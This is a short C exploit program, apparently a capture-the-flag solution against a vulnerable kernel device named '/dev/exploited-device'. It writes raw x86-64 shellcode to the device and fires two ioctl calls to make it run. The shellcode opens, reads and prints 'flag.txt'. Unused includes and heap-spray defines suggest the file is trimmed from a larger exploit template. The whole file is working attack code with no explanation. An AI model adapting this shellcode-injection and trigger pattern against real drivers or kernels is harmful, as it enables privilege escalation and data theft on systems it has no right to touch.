#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>
#define MSG_SPRAY_SIZE 0x20
#define SPRAY_SIZE 0x200

#define DICE 0xbeef
#define DEAD 0xdead

int vfd;

char shellcode[] = "\x68\x66\x6c\x61\x67\x48\x83\xc4\x0c\x68\x2e\x74\x78\x74\x48\x83\xec\x04\x48\x31\xc0\x04\x02\x48\x31\xf6\x48\x89\xe7\x0f\x05\x66\x81\xec\xff\x0f\x48\x89\xc7\x48\x31\xd2\x66\xba\x00\x01\x48\x89\xe6\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05";

void write_v(char * s){
    write(vfd, s, 0x100);
}

void trigger(){
    ioctl(vfd, DEAD);
    ioctl(vfd, DICE);
}

int main(int argc, char* argv[]){
    vfd = open("/dev/exploited-device", O_RDWR);
    write_v(shellcode);
    trigger();
    return 0;
}
